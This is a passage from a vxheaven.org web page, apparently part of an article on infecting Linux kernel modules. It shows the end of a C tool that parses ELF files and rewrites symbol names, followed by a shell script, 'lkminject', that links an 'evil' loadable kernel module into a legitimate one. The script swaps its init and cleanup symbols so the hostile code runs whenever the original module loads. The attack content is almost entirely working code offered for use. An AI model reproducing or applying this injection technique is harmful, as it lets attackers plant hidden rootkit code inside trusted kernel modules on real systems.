&nbsp; ElfGetSectionByIndex <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> ehdr<span style="color: #339933;">,</span> ehdr<span style="color: #339933;">-&gt;</span>e_shstrndx<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>shstrtable<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a> <span style="color: black;">&#40;</span>name<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>name<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&lt;</span>ehdr<span style="color: #339933;">-&gt;</span>e_shnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">*</span> ehdr<span style="color: #339933;">-&gt;</span>e_shentsize<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> fd<span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Sections header corrupted&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; ElfGetSectionName <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> shdr<span style="color: #339933;">-&gt;</span>sh_name<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>shstrtable<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;name<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>name<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a> <span style="color: black;">&#40;</span>name<span style="color: #339933;">,</span> section<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> ElfGetSectionName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Word sh_name<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; Elf32_Shdr <span style="color: #339933;">*</span>shstrtable<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>res<span style="color: #339933;">,</span> <span style="color: #993333;">size_t</span> len<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">size_t</span> i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> shstrtable<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> sh_name<span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">&lt;</span> len<span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <span style="color: #339933;">*</span>res <span style="color: #339933;">==</span> <span style="color: #ff0000;">'<span style="color: #006699; font-weight: bold;">\0</span>'</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #339933;">*</span>res <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fgetc.html"><span style="color: #000066;">fgetc</span></a> <span style="color: black;">&#40;</span>fd<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; i<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; res<span style="color: #339933;">++;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
Elf32_Off ElfGetSymbolName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Word sym_name<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; Elf32_Shdr <span style="color: #339933;">*</span>strtable<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>res<span style="color: #339933;">,</span> <span style="color: #993333;">size_t</span> len<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">size_t</span> i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> strtable<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> sym_name<span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">&lt;</span> len<span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <span style="color: #339933;">*</span>res <span style="color: #339933;">==</span> <span style="color: #ff0000;">'<span style="color: #006699; font-weight: bold;">\0</span>'</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #339933;">*</span>res <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fgetc.html"><span style="color: #000066;">fgetc</span></a> <span style="color: black;">&#40;</span>fd<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; i<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; res<span style="color: #339933;">++;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span>strtable<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> sym_name<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: #808080; font-style: italic;">/* EOF */</span><br/>
&nbsp;</div>
<h3><a name="c92"></a>9.2 Lkminject</h3>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh </span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># lkminject by truff (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0470767162624474766b6e6170332a6b7663">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>)</span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># Injects a Linux lkm into another one.</span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># Usage:</span><br/>
<span style="color: #666666; font-style: italic;"># ./lkminfect.sh original_lkm.o evil_lkm.c</span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># Notes:</span><br/>
<span style="color: #666666; font-style: italic;"># You have to modify evil_lkm.c as explained bellow:</span><br/>
<span style="color: #666666; font-style: italic;"># In the init_module code, you have to insert this line, just after</span><br/>
<span style="color: #666666; font-style: italic;"># variables init:</span><br/>
<span style="color: #666666; font-style: italic;"># dumm_module ();</span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># In the cleanup_module code, you have to insert this line, just after</span><br/>
<span style="color: #666666; font-style: italic;"># variables init:</span><br/>
<span style="color: #666666; font-style: italic;"># dummcle_module ();</span><br/>
<span style="color: #666666; font-style: italic;">#</span><br/>
<span style="color: #666666; font-style: italic;"># &nbsp; &nbsp; &nbsp;http://www.projet7.org &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- Security Researchs -</span><br/>
<span style="color: #666666; font-style: italic;">###########################################################################</span><br/>
<br/>
<br/>
<span style="color: #c20cb9; font-weight: bold;">sed</span> <span style="color: #660033;">-e</span> s<span style="color: #000000; font-weight: bold;">/</span>init_module<span style="color: #000000; font-weight: bold;">/</span>evil_module<span style="color: #000000; font-weight: bold;">/</span> <span style="color: #007800;">$2</span> <span style="color: #000000; font-weight: bold;">&gt;</span> tmp<br/>
<span style="color: #c20cb9; font-weight: bold;">mv</span> tmp <span style="color: #007800;">$2</span><br/>
<br/>
<span style="color: #c20cb9; font-weight: bold;">sed</span> <span style="color: #660033;">-e</span> s<span style="color: #000000; font-weight: bold;">/</span>cleanup_module<span style="color: #000000; font-weight: bold;">/</span>evclean_module<span style="color: #000000; font-weight: bold;">/</span> <span style="color: #007800;">$2</span> <span style="color: #000000; font-weight: bold;">&gt;</span> tmp<br/>
<span style="color: #c20cb9; font-weight: bold;">mv</span> tmp <span style="color: #007800;">$2</span><br/>
<br/>
<span style="color: #666666; font-style: italic;"># Replace the following line with the compilation line for your evil lkm </span><br/>
<span style="color: #666666; font-style: italic;"># if needed. </span><br/>
<span style="color: #c20cb9; font-weight: bold;">make</span><br/>
<br/>
<span style="color: #c20cb9; font-weight: bold;">ld</span> <span style="color: #660033;">-r</span> <span style="color: #007800;">$1</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">basename</span> <span style="color: #007800;">$2</span> .c<span style="color: black;">&#41;</span>.o <span style="color: #660033;">-o</span> evil.o<br/>
<br/>
.<span style="color: #000000; font-weight: bold;">/</span>elfstrchange evil.o init_module dumm_module<br/>
.<span style="color: #000000; font-weight: bold;">/</span>elfstrchange evil.o evil_module init_module<br/>
.<span style="color: #000000; font-weight: bold;">/</span>elfstrchange evil.o cleanup_module dummcle_module<br/>
.<span style="color: #000000; font-weight: bold;">/</span>elfstrchange evil.o evclean_module cleanup_module<br/>
<br/>
<span style="color: #c20cb9; font-weight: bold;">mv</span> evil.o <span style="color: #007800;">$1</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> elfstrchange<br/>
&nbsp;</div>
[<a style="" href="/lib/?lang=EN&amp;index=RK#vtr00">Back to index</a>] [<a href="/lib/vtr00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vtr00">de</a><a href="/lib/index.php?lang=en&amp;id=vtr00">en</a><a href="/lib/index.php?lang=es&amp;id=vtr00">es</a><a href="/lib/index.php?lang=it&amp;id=vtr00">it</a><a href="/lib/index.php?lang=fr&amp;id=vtr00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vtr00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vtr00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vtr00">ua</a></div>
</body>
</html>
